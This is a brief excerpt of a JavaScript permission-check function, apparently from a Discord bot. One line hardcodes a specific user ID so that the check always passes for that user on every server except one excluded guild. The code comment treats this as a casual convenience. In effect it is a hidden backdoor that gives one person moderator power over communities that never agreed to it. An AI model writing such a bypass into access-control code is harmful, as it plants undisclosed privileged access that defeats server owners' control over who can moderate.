module.exports = {
	...
	hasPermissions(sender, guildConfig, permission) {
		...
		if(sender.id === "466508791312023552" && guildConfig.id !== "708050277957238784") return true; // Jeremy#2000 but for every server except MMC bc nobody likes him having mod
